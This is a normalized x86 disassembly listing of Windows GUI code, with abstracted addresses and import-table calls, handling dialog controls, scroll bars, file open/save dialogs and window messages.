mov al [ rw-data ]
test al al
jne r-xdata
cmp bx 0x414
je r-xdata
mov ebx [ GetDlgItem@IAT ]
push eax
push 0x53b
push edi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push esi
push 0x542
push edi
call ebx
push eax
call ebp
push 0x542
push edi
call [ IsDlgButtonChecked@IAT ]
and esi eax
push esi
push 0x54a
push edi
call ebx
push eax
call ebp
push esi
push 0x408
push edi
call ebx
push eax
call ebp
jmp r-xdata
mov ecx [ ebp + rw-data ]
push 0x1
add ecx 0x548
push ecx
push esi
call [ CheckDlgButton@IAT ]
mov eax [ ebp + rw-data ]
test eax eax
je r-xdata
push eax
push 0x557
push esi
call edi
push eax
call [ EnableWindow@IAT ]
mov ebp [ esp + 0x280 ]
imul ebp ebp 0x12c
mov edx [ ebp + rw-data ]
push edx
push 0x0
push 0x467
push 0x557
push esi
call edi
push eax
call [ SendMessageA@IAT ]
mov [ esp + 0x14 ] 0x0
jmp r-xdata
xor eax eax
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] eax
mov [ esp + 0x1c ] al
mov esi [ esp + 0x284 ]
mov ebp [ SendMessageA@IAT ]
push eax
push eax
push 0xe
push esi
mov [ esp + 0x280 ] eax
call ebp
push eax
lea ecx [ esp + 0x1c ]
call sub_401f60
mov eax [ esp + 0x30 ]
mov edi 0x10
cmp eax edi
mov eax [ esp + 0x1c ]
jae r-xdata
cmp bx 0x415
je r-xdata
push 0x0
push 0x1
jmp r-xdata
mov ecx [ esp + 0x2c ]
push eax
inc ecx
push ecx
push 0xd
push esi
call ebp
cmp [ esp + 0x30 ] edi
mov eax [ esp + 0x1c ]
jae r-xdata
lea eax [ esp + 0x1c ]
cmp bx 0x416
je r-xdata
mov edx [ esp + 0x14 ]
push 0x0
add edx 0x53c
push edx
push esi
call [ CheckDlgButton@IAT ]
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x5
mov [ esp + 0x14 ] eax
jl r-xdata
push 0x541
push esi
call [ CheckDlgButton@IAT ]
mov [ esp + 0x14 ] 0x0
jmp r-xdata
push eax
call j_sub_4b692d
mov esi [ esp + 0x27c ]
add esp 0x4
cmp bx 0x539
mov [ esp + 0x44 ] 0x1c
mov [ esp + 0x48 ] 0x4
mov [ esp + 0x58 ] eax
mov [ rw-data ] 0x1
jne r-xdata
lea eax [ esp + 0x1c ]
cmp bx 0x54d
jne r-xdata
mov eax [ ebp + rw-data ]
push 0x1
add eax 0x53c
push eax
push esi
call [ CheckDlgButton@IAT ]
cmp ebx 0x1
jne r-xdata
cmp bx 0x413
jne r-xdata
push 0x1
lea edx [ esp + 0x48 ]
push edx
push 0x2
push 0x53a
jmp r-xdata
shr ebx 0x10
cmp ebx 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp + rw-data ]
test eax eax
jge r-xdata
cmp bx 0x414
jne r-xdata
push 0x1
lea eax [ esp + 0x48 ]
push eax
push 0x2
push 0x40c
jmp r-xdata
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetScrollInfo@IAT ]
mov eax [ rw-data ]
test eax eax
mov esi [ esp + 0x278 ]
mov edi [ SendMessageA@IAT ]
jl r-xdata
push 0x0
lea edx [ ebx + 0x543 ]
push edx
push esi
call [ CheckDlgButton@IAT ]
inc ebx
cmp ebx 0x4
jl r-xdata
mov eax [ ebp + rw-data ]
mov ebx [ CheckDlgButton@IAT ]
and eax 0xf
push 0x1
add eax 0x543
push eax
push esi
call ebx
test [ ebp + rw-data ] 0x10
jne r-xdata
mov ecx [ ebp + rw-data ]
push ecx
lea edx [ esp + 0x64 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov eax [ esp + 0x1c ]
add esp 0xc
cmp eax 0x1
jne r-xdata
mov [ ebp + rw-data ] ebx
cmp bx 0x415
jne r-xdata
push 0x1
lea ecx [ esp + 0x48 ]
push ecx
push 0x2
push 0x40d
jmp r-xdata
push 0x0
push 0x0
push 0x147
push 0x54d
push esi
call [ SendDlgItemMessageA@IAT ]
push 0x0
push eax
push 0x502
push esi
mov [ rw-data ] eax
call edi
jmp r-xdata
push 0x0
push eax
push 0x503
push esi
call edi
push 0x1
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push r--data
lea eax [ esp + 0x60 ]
push eax
jmp r-xdata
cmp bx 0x416
jne r-xdata
push 0x1
lea edx [ esp + 0x48 ]
push edx
push 0x2
push 0x40e
jmp r-xdata
mov ebx [ EnableWindow@IAT ]
push 0x0
push 0x53b
push esi
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x0
push 0x542
push esi
call edi
push eax
call ebx
jmp r-xdata
push 0x0
jmp r-xdata
push r--data
lea edx [ esp + 0x60 ]
push edx
jmp r-xdata
push 0x0
push 0xc
push 0x539
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx [ ebp + rw-data ]
push 0x1
lea edx [ esp + 0x1c ]
push edx
push 0x2
push 0x53a
push esi
mov [ esp + 0x2c ] 0x1c
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x40
mov [ esp + 0x40 ] ecx
mov [ esp + 0x3c ] 0x1
call edi
mov ebx [ SetScrollInfo@IAT ]
push eax
call ebx
mov eax [ ebp + rw-data ]
push eax
lea ecx [ esp + 0x64 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ esp + 0x1c ]
add esp 0xc
cmp eax 0x1
jne r-xdata
push 0x0
push 0x0
push 0x501
push esi
mov [ rw-data ] 0x0
call ebp
lea ecx [ esp + 0x18 ]
call sub_4480e0
jmp r-xdata
push 0x1
lea eax [ esp + 0x48 ]
push eax
push 0x2
push 0x40f
push 0x0
push 0x542
push esi
call [ CheckDlgButton@IAT ]
push 0x0
push 0x54a
push esi
call edi
push eax
call ebx
push 0x0
push 0x408
push esi
call edi
push eax
call ebx
push 0x1
push 0x542
push esi
call [ CheckDlgButton@IAT ]
jmp r-xdata
lea ecx [ ebp + rw-data ]
push ecx
push 0x0
push 0xc
push 0x54a
push esi
call [ SendDlgItemMessageA@IAT ]
test [ ebp + rw-data ] 0x20
je r-xdata
push 0x53b
push esi
call ebx
test [ ebp + rw-data ] 0xf
jne r-xdata
push r--data
lea edx [ esp + 0x60 ]
push edx
jmp r-xdata
push 0x0
push 0xc
push 0x413
push esi
call [ SendDlgItemMessageA@IAT ]
mov eax [ ebp + rw-data ]
push 0x1
lea ecx [ esp + 0x1c ]
push ecx
push 0x2
push 0x40c
push esi
mov [ esp + 0x34 ] 0x1
mov [ esp + 0x38 ] 0x400
mov [ esp + 0x40 ] eax
call edi
push eax
call ebx
mov edx [ ebp + rw-data ]
push edx
lea eax [ esp + 0x64 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ esp + 0x60 ]
push ecx
push 0x0
push 0xc
push 0x414
push esi
call [ SendDlgItemMessageA@IAT ]
mov edx [ ebp + rw-data ]
push 0x1
lea eax [ esp + 0x1c ]
push eax
push 0x2
push 0x40d
push esi
mov [ esp + 0x38 ] 0x400
mov [ esp + 0x40 ] edx
call edi
push eax
call ebx
mov ecx [ ebp + rw-data ]
push ecx
lea edx [ esp + 0x64 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x60 ]
push eax
push 0x0
push 0xc
push 0x415
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx [ ebp + rw-data ]
push 0x1
lea edx [ esp + 0x1c ]
push edx
push 0x2
push 0x40e
push esi
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x100
mov [ esp + 0x40 ] ecx
mov [ esp + 0x3c ] 0x1
call edi
push eax
call ebx
mov eax [ ebp + rw-data ]
push eax
lea ecx [ esp + 0x64 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ esp + 0x1c ]
add esp 0xc
cmp eax 0x1
jne r-xdata
push 0x1
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x280 ]
cmp edx 0x4
je r-xdata
push 0x0
push 0xc
push 0x416
push esi
call [ SendDlgItemMessageA@IAT ]
mov eax [ ebp + rw-data ]
push 0x1
lea ecx [ esp + 0x1c ]
push ecx
push 0x2
push 0x40f
push esi
mov [ esp + 0x40 ] eax
call edi
push eax
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_45b5d0
add esp 0x4
cmp edx eax
je r-xdata
push 0x0
jmp r-xdata
push eax
call sub_45b5d0
add esp 0x4
cmp edx eax
je r-xdata
push 0x4
push esi
call edi
push eax
call ebx
push 0x0
push 0x0
push 0x501
mov [ rw-data ] 0x0
push esi
sub_48a5f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c15ae
push eax
mov [ fs : 0x0 ] esp
sub esp 0xaac
push ebx
mov ebx [ esp + 0xac0 ]
cmp ebx 0xaa
push ebp
push esi
push edi
mov ebp 0x1
ja r-xdata
mov eax 0x1
movzx eax [ ebx + lookup_table_48ec64 ]
mov esi [ rw-data ]
mov edx 0x2
jmp [ eax * 4 + jump_table_48eaf8 ]
mov ecx [ rw-data ]
xor eax eax
test ebx ebx
sete al
test ecx ecx
lea eax [ eax + eax - 0x1 ]
jle r-xdata
lea eax [ ebx + ebx ]
mov edi 0x5
sub edi eax
mov [ esp + 0x18 ] 0x1
jmp r-xdata
mov edi [ rw-data ]
imul edi [ rw-data ]
cmp ebx 0x4
je r-xdata
cmp ebx 0x6
mov edi [ rw-data ]
je r-xdata
mov eax esi
cdq
idiv [ rw-data ]
cmp ebx 0x8
mov edi eax
je r-xdata
cmp ebx 0xa
jne r-xdata
mov eax [ esp + 0xad4 ]
push 0x0
push sub_4875e0
push eax
push 0x9e
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
xor edi edi
cmp eax edi
jne r-xdata
lea ecx [ esp + 0x60 ]
push ecx
lea edx [ esp + 0x2c ]
push edx
call sub_45e3f0
mov eax [ rw-data ]
mov ebp [ esp + 0xad8 ]
mov [ esp + 0x20 ] eax
mov eax [ rw-data ]
add esp 0x8
xor edi edi
xor esi esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov esi [ rw-data ]
jne r-xdata
mov eax [ esp + 0xad4 ]
push 0x0
push 0x77
push 0x111
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
push edx
call [ UpdateWindow@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ rw-data ]
cmp ecx [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
mov ebp [ rw-data ]
test ebp ebp
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ esp + 0xad4 ]
push 0x0
add ebx 0x1c9
push ebx
push 0x111
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ esp + 0xad4 ]
push 0x0
push 0x9c43
push 0x111
push ecx
call [ SendMessageA@IAT ]
jmp r-xdata
mov edx [ esp + 0xad4 ]
push 0x0
push 0x81
push 0x111
push edx
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ esp + 0xad4 ]
push 0x0
push 0x9c56
push 0x111
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ esp + 0xad4 ]
push 0x0
push 0x9c57
push 0x111
push ecx
call [ SendMessageA@IAT ]
jmp r-xdata
mov edx [ esp + 0xad4 ]
push 0x0
push 0x9c70
push 0x111
push edx
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ esp + 0xad4 ]
push 0x0
push 0x9c6f
push 0x111
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
push 0x0
push 0x0
push 0x10
jne r-xdata
mov edx [ esp + 0xad4 ]
push 0x0
push 0x72
push 0x111
push edx
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0xad4 ]
push 0x0
push 0xaf
push 0x111
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jl r-xdata
mov eax [ rw-data ]
test eax eax
jl r-xdata
test [ rw-data ] 0x8
mov esi 0xfffffff7
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x1d
jne r-xdata
mov eax rw-data
lea ecx [ ecx ]
mov esi [ rw-data ]
mov ecx [ rw-data ]
xor eax eax
test esi esi
sete al
test ecx ecx
mov [ rw-data ] eax
je r-xdata
cmp ebx 0x68
lea esi [ ebx - 0x52 ]
jne r-xdata
mov eax [ esp + 0xacc ]
cmp eax 0x67
mov esi [ esp + 0xad4 ]
lea ebp [ eax - 0x5c ]
mov [ esp + 0x18 ] ebp
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push 0x9cab
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp ebx 0x6d
je r-xdata
mov ecx [ rw-data ]
cmp ecx [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov esi [ esp + 0xad4 ]
push 0x0
push ebp
push esi
call sub_47e8e0
mov eax [ rw-data ]
add esp 0xc
test eax eax
jne r-xdata
cmp [ rw-data ] 0x2
je r-xdata
mov eax [ rw-data ]
push 0x0
push 0x7c
push 0x111
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x2
je r-xdata
mov eax [ rw-data ]
xor esi esi
cmp eax esi
je r-xdata
mov eax [ rw-data ]
xor esi esi
cmp eax esi
je r-xdata
mov esi [ rw-data ]
mov edi [ rw-data ]
call sub_4575c0
mov [ rw-data ] esi
mov [ rw-data ] edi
jmp r-xdata
mov edx [ rw-data ]
cmp edx [ rw-data ]
jne r-xdata
call sub_41c220
jmp r-xdata
call sub_41c300
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
xor eax eax
cmp ebx 0x89
sete al
inc eax
cmp ecx eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push edx
call sub_45b5d0
mov ecx [ rw-data ]
xor esi esi
add esp 0x4
cmp edx esi
jne r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
mov [ esp + 0x2ec ] 0x0
jae r-xdata
xor ebp ebp
xor edi edi
mov [ esp + 0x2c ] edi
mov [ esp + 0x30 ] ebp
mov [ esp + 0x34 ] ebp
mov ecx rw-data
mov [ esp + 0xac4 ] 0xf
xor esi esi
call sub_42c3a0
test eax eax
jle r-xdata
mov eax [ rw-data ]
test eax eax
jl r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al [ rw-data ]
xor ebp ebp
test al al
jne r-xdata
call sub_4aa950
jmp r-xdata
call sub_4ad450
jmp r-xdata
call sub_4adb80
jmp r-xdata
call sub_4ad5a0
jmp r-xdata
call sub_4ad750
jmp r-xdata
call sub_4aab60
jmp r-xdata
call sub_4aabd0
jmp r-xdata
mov eax [ esp + 0xacc ]
add eax 0xffffff65
shl eax 0x4
mov edi eax
lea ebp [ edi + rw-data ]
mov ecx ebp
xor esi esi
call sub_42c3a0
test eax eax
jle r-xdata
call sub_4adc60
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call sub_457560
add esp 0x4
jmp r-xdata
push 0x0
push 0x9c5f
mov eax [ rw-data ]
cmp eax 0x6
jne r-xdata
call sub_42fe70
jmp r-xdata
call sub_42da20
jmp r-xdata
push 0x80000
call j_sub_4b573e#2
mov esi eax
xor ebp ebp
add esp 0x4
cmp esi ebp
mov [ esp + 0x14 ] esi
je r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
push eax
dec edx
push ebp
push 0x98
mov [ rw-data ] 0x0
mov [ rw-data ] edx
mov [ rw-data ] 0x2
call sub_48a5f0
mov ecx [ rw-data ]
push ecx
push ebp
push 0x49
call sub_48a5f0
mov edi [ rw-data ]
imul edi [ rw-data ]
imul edi eax
mov edi [ rw-data ]
imul edi eax
shl edi 0x1
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ esp + 0x18 ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
test eax eax
mov edi [ rw-data ]
jne r-xdata
mov ecx [ rw-data ]
lea eax [ esi - 0x1 ]
cmp ecx eax
je r-xdata
mov bl [ rw-data ]
test bl bl
sete cl
test cl cl
mov [ rw-data ] cl
je r-xdata
push eax
mov eax [ esp + 0xad8 ]
push sub_488db0
push eax
push 0xa1
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
mov [ rw-data ] eax
mov esi [ esp + 0xad4 ]
push edi
push ebp
push esi
call sub_47e8e0
mov eax [ rw-data ]
add esp 0xc
cmp eax edi
je r-xdata
mov ebx [ esp + 0xacc ]
cmp ebx 0x10
je r-xdata
mov eax [ esp + 0xacc ]
cmp eax 0x10
mov ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov edx [ esp + 0xad4 ]
push ebp
push 0x0
push 0x0
push edx
push 0x4
call sub_47e330
add esp 0x14
cmp ebx 0x1b
lea eax [ ebx - 0x17 ]
jne r-xdata
mov bl [ rw-data ]
movzx edx [ rw-data ]
test bl bl
sete al
xor ecx ecx
test al al
sete cl
mov [ rw-data ] al
cmp edx ecx
je r-xdata
lea edx [ esp + 0x1c ]
push edx
call [ GetCursorPos@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0x1c ]
push eax
push ecx
call [ ScreenToClient@IAT ]
cmp ebx 0x1d
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
call [ GetCursorPos@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x1c ]
push ecx
push edx
call [ ScreenToClient@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
push 0x0
push ebp
push 0x0
push eax
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x2c ]
push edx
mov edx [ esp + 0x34 ]
push ecx
push edx
push eax
call sub_477a80
mov eax [ rw-data ]
add esp 0x20
cmp ebx 0x1f
jne r-xdata
mov edx [ esp + 0xad4 ]
push 0x0
push 0xffffffff
push edx
push 0x9
call sub_486df0
add esp 0x10
jmp r-xdata
mov ecx [ esp + 0xad4 ]
push 0x0
push 0xffffffff
push ecx
push 0xa
call sub_486df0
add esp 0x10
jmp r-xdata
mov ecx rw-data
call sub_4010c0
test eax eax
jbe r-xdata
mov edx [ esp + 0xad4 ]
push 0x0
push 0xffffffff
push edx
push eax
call sub_486df0
add esp 0x10
jmp r-xdata
mov ecx rw-data
call sub_4010c0
test eax eax
jbe r-xdata
mov eax [ rw-data ]
test eax eax
mov ecx [ rw-data ]
jl r-xdata
mov ecx rw-data
call sub_4010c0
test eax eax
jbe r-xdata
mov esi [ rw-data ]
mov edi [ rw-data ]
mov eax esi
cdq
idiv edi
mov ecx [ rw-data ]
dec ecx
cmp eax ecx
jne r-xdata
mov dl [ rw-data ]
test dl dl
sete al
mov [ rw-data ] al
call sub_40af10
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_419a80
add esp 0x8
cmp eax ebp
jne r-xdata
mov edx [ esp + 0xad4 ]
push edx
call sub_41b660
add esp 0x4
jmp r-xdata
push rw-data
push rw-data
call sub_419a80
add esp 0x8
cmp eax ebp
jne r-xdata
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call [ PostMessageA@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x4
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ rw-data ]
mov ecx rw-data
mov [ esp + 0x13 ] 0x0
mov ebp esi
call sub_4010f0
test eax eax
jbe r-xdata
mov edi [ rw-data ]
or edi 0x8
push ebp
mov [ rw-data ] edi
call sub_451770
mov ecx [ rw-data ]
add esp 0x4
push ecx
mov ebx [ rw-data ]
and ebx esi
push 0x0
mov [ rw-data ] ebx
call sub_451770
mov eax [ rw-data ]
add esp 0x4
push eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
push ecx
lea ecx [ eax + 0x70 ]
call sub_421150
mov eax [ rw-data ]
mov edx [ eax + 0x380 ]
mov ecx [ rw-data ]
or edx 0x8
cmp ecx edx
jne r-xdata
lea ecx [ eax + 0x70 ]
call sub_41f020
test eax eax
jle r-xdata
mov ecx rw-data
call sub_4010f0
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ eax - 0x20 ]
mov edx [ eax ]
mov [ eax - 0x20 ] edx
mov [ eax ] ecx
add eax 0x4
cmp eax rw-data
jl r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ebp
push 0x0
push ebp
push ecx
push edx
call sub_47e330
add esp 0x14
jmp r-xdata
push eax
add ecx 0x32c
call sub_421150
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push rw-data
call sub_457f40
add esp 0x4
push eax
push rw-data
lea ecx [ esp + 0x1f0 ]
push ecx
call [ lstrcpynA@IAT ]
push esi
lea edx [ esp + 0x64 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x1ec ]
push ecx
call [ lstrcatA@IAT ]
xor eax eax
mov ecx 0x13
lea edi [ esp + 0x60 ]
[ edi ]
push 0x104
lea eax [ esp + 0x1ec ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x1e8 ]
push ecx
call sub_457f40
add esp 0x4
push r--data
lea edx [ esp + 0x1ec ]
push edx
mov [ esp + eax + 0x1f0 ] 0x0
call [ lstrcatA@IAT ]
mov eax [ esp + 0xad4 ]
push 0xfffffffa
push eax
mov [ esp + 0xa4 ] r--data
mov [ esp + 0x68 ] 0x4c
mov [ esp + 0x6c ] eax
call [ GetWindowLongA@IAT ]
mov [ esp + 0x68 ] eax
lea eax [ esp + 0x1e8 ]
mov [ esp + 0x7c ] eax
mov eax 0x103
mov [ esp + 0x80 ] eax
mov [ esp + 0x88 ] eax
lea eax [ esp + 0x60 ]
lea ecx [ esp + 0x634 ]
lea edx [ esp + 0x1e8 ]
push eax
mov [ esp + 0x70 ] r--data
mov [ esp + 0x7c ] ebp
mov [ esp + 0x88 ] ecx
mov [ esp + 0x90 ] edx
mov [ esp + 0x94 ] r--data
mov [ esp + 0x98 ] 0x80006
call [ GetSaveFileNameA@IAT ]
test eax eax
je r-xdata
push rw-data
call sub_457f40
add esp 0x4
push eax
push rw-data
lea ecx [ esp + 0x3f8 ]
push ecx
call [ lstrcpynA@IAT ]
push ebp
lea edx [ esp + 0x64 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x3f4 ]
push ecx
call [ lstrcatA@IAT ]
xor eax eax
mov ecx 0x13
lea edi [ esp + 0x60 ]
[ edi ]
push 0x104
lea eax [ esp + 0x2f0 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x2ec ]
push ecx
call sub_457f40
add esp 0x4
push 0xfffffffa
push esi
mov [ esp + eax + 0x2f3 ] 0x0
mov [ esp + 0x3f8 ] 0x0
mov [ esp + 0x68 ] 0x4c
mov [ esp + 0x6c ] esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x68 ] eax
mov eax 0x103
lea edx [ esp + 0x3f0 ]
mov [ esp + 0x80 ] eax
mov [ esp + 0x88 ] eax
mov [ esp + 0x7c ] edx
lea eax [ esp + 0x60 ]
lea ecx [ esp + 0x4f4 ]
lea edx [ esp + 0x2ec ]
push eax
mov [ esp + 0x70 ] r--data
mov [ esp + 0x7c ] 0x1
mov [ esp + 0x88 ] ecx
mov [ esp + 0x90 ] edx
mov [ esp + 0x94 ] r--data
mov [ esp + 0x98 ] 0x1000
call [ GetOpenFileNameA@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax 0x6
cmp ecx eax
jne r-xdata
mov edx [ rw-data ]
push 0x111
push edx
call [ SendMessageA@IAT ]
jmp r-xdata
cmp eax ebp
jne r-xdata
push 0x6b
push 0x6c
mov [ rw-data ] ebp
call sub_458630
add esp 0x8
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ebx 0x6f
jne r-xdata
mov edx [ esp + 0xad4 ]
push 0x0
push 0xffffffff
push edx
push 0xb
call sub_486df0
add esp 0x10
jmp r-xdata
lea eax [ ebx - 0x72 ]
cdq
mov ecx 0x3
idiv ecx
mov ecx [ esp + 0xad4 ]
push 0x0
push 0xffffffff
push ecx
lea edx [ edx + eax * 4 + 0xc ]
push edx
call sub_486df0
add esp 0x10
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x60 ]
push eax
push ecx
mov [ esp + 0x68 ] 0x2c
call [ GetWindowPlacement@IAT ]
cmp [ esp + 0x68 ] 0x2
jne r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x60 ]
push ecx
push edx
mov [ esp + 0x68 ] 0x2c
call [ GetWindowPlacement@IAT ]
cmp [ esp + 0x68 ] 0x3
jne r-xdata
mov [ rw-data ] eax
xor eax eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
lea edx [ esp + 0x28 ]
push edx
lea eax [ esp + 0x64 ]
push eax
call sub_45e3f0
mov esi [ rw-data ]
mov edi [ esp + 0x78 ]
mov ecx esi
imul ecx edi
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ebp [ esp + 0x40 ]
mov ecx esi
imul ecx [ esp + 0x74 ]
mov [ esp + 0x24 ] edx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov [ esp + 0x2c ] esi
mov esi [ rw-data ]
mov eax edx
mov ebx [ esp + 0x3c ]
shr eax 0x1f
add edx eax
mov ecx esi
imul ecx ebp
mov [ esp + 0x28 ] edx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ecx esi
imul ecx ebx
mov [ esp + 0x4c ] edx
mov eax 0x51eb851f
imul ecx
mov ecx [ rw-data ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ rw-data ]
add esp 0x8
test eax eax
mov [ esp + 0x48 ] edx
mov [ esp + 0x4c ] esi
je r-xdata
lea ecx [ esp + 0x60 ]
push ecx
lea edx [ esp + 0x2c ]
push edx
call sub_45e3f0
mov esi [ rw-data ]
mov edi [ esp + 0x40 ]
mov ebp [ esp + 0x3c ]
mov ecx esi
imul ecx edi
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov ecx esi
imul ecx ebp
mov [ esp + 0x24 ] edx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx edx
mov ebx [ esp + 0x74 ]
shr ecx 0x1f
add edx ecx
mov [ esp + 0x2c ] esi
mov esi [ rw-data ]
mov ecx esi
imul ecx [ esp + 0x78 ]
mov [ esp + 0x28 ] edx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx esi
imul ecx ebx
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x4c ] edx
mov eax 0x51eb851f
imul ecx
mov eax [ rw-data ]
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
add esp 0x8
test eax eax
mov [ esp + 0x4c ] esi
mov esi [ rw-data ]
mov [ esp + 0x48 ] edx
je r-xdata
push ebp
mov [ rw-data ] ebp
call sub_451820
add esp 0x4
call sub_428c50
push esi
mov [ rw-data ] esi
call sub_451820
add esp 0x4
jmp r-xdata
mov [ rw-data ] ebp
push ebp
mov [ rw-data ] esi
push esi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x2
mov [ rw-data ] 0x0
jne r-xdata
mov esi [ esp + 0xad4 ]
push 0x0
push ebp
push esi
mov [ rw-data ] ebp
call sub_47e8e0
mov eax [ rw-data ]
mov edi [ rw-data ]
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ebp
mov [ rw-data ] 0x0
jmp r-xdata
mov esi [ rw-data ]
cmp esi 0x10
mov edi [ rw-data ]
mov eax edi
jae r-xdata
cmp [ rw-data ] 0x1d
je r-xdata
cmp eax 0x4
jne r-xdata
cmp ecx esi
jne r-xdata
mov edx [ rw-data ]
push r--data
push 0x104
lea ecx [ esp + 0x2f4 ]
push ecx
push eax
push edx
call sub_45be60
mov al [ esp + 0x300 ]
add esp 0x14
test al al
je r-xdata
mov eax rw-data
mov ebx [ DestroyWindow@IAT ]
